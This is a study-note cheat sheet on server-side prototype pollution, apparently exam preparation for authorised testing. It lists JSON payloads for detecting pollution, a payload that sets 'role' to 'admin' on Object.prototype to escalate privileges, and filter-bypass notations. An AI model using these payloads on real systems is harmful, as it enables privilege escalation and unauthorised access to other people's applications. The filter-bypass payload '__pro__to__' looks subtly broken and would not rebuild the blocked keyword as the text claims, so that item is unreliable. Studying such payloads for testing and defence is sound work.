# Server-Side Prototype Pollution – Payload Examples

> [!summary]  
> _Quick-reference guide for understanding how and why specific payloads are used during server-side prototype pollution testing._

---

## Switching `Content-Type` for Payload Injection

### Original Content-Type:

```
Content-Type: application/x-www-form-urlencoded
```

**Example Body:**

```
username=john&password=1234
```

- Only supports **flat key-value pairs**
    
- _Does not support_ **nested objects**
    
- Therefore, _you cannot inject_ properties like `__proto__` with this content type
    

---

### Updated Content-Type:

```
Content-Type: application/json
```

**Example Payload:**

```json
{
  "__proto__": {
    "polluted": true
  }
}
```

- Supports **nested JSON objects**
    
- This format **mimics JavaScript object structure**, which is required for prototype pollution attacks
    

> [!note]  
> _Changing the content type to `application/json` is essential for delivering complex, nested payloads used in prototype pollution._

---

## Safe Proof-of-Concept Payload

> [!success]  
> **Use this payload to verify pollution _without_ crashing or breaking the app.**

**Payload:**

```json
{
  "__proto__": {
    "status": 599
  }
}
```

**Behavior:**

- Server normally returns `400 Bad Request` for malformed JSON
    
- If pollution is successful, the server returns a **`599 Custom Status`**
    

> [!caution]  
> _Avoid using high-impact payloads unless necessary. Modifying sensitive or critical properties may cause the app to crash or enter an unstable state._

---

## Generic Prototype Pollution Payload

**Payload:**

```json
{
  "__proto__": {
    "polluted": true
  }
}
```

**Verification in Debugger:**

```javascript
console.log({}.polluted); // true confirms pollution
```

> [!note]  
> _This test helps verify if the prototype has been polluted, even if there is no visible change in the UI or HTTP response._

---

## Role Escalation Exploit

### Application Logic Example:

```javascript
if (request.session.role !== 'admin') redirect();
```

### Payload for Escalation:

```json
{
  "__proto__": {
    "role": "admin"
  }
}
```

**Result:** Every object that checks `role` will inherit `admin`, granting unintended privileges.

> [!danger]  
> _Polluting sensitive properties like `role`, `isAdmin`, or `authenticated` can escalate privileges across all sessions. Use with extreme care._

---

## Filter Bypass Strategies

### Example of Filtered Payload:

If the server blocks `__proto__`, try variations like:

```json
{
  "__pro__to__": {
    "polluted": true
  }
}
```

### Other Notation Options:

```javascript
obj['__proto__']
({}).constructor.prototype
Object.prototype
```

> [!warning]  
> _Some filters may only match exact keywords. Always test with alternate encodings and notations to bypass basic filters._

---

## Payload Examples Table

|**Use Case**|**Payload**|**Purpose / Effect**|
|---|---|---|
|Safe confirmation|`{"__proto__":{"status":599}}`|Verifies pollution via custom status code|
|General test|`{"__proto__":{"polluted":true}}`|Checks for polluted values in debugger|
|Role escalation|`{"__proto__":{"role":"admin"}}`|Elevates role if app uses global role checks|
|Bypass filters|`{"__pro__to__":{"polluted":true}}`|Avoids blacklisted `__proto__` keyword|

---

> [!success]  
> **Exam Essentials:**
> 
> - Change `Content-Type` to `application/json` to deliver nested objects
>     
> - Use _low-impact payloads_ to confirm pollution without disruption
>     
> - Always verify using debugging tools like the server console or `console.log({}.polluted)`
>     
> - Use alternate notations or bypass techniques if filters block your payload
>     
> - Target sensitive properties carefully if attempting privilege escalation
>     
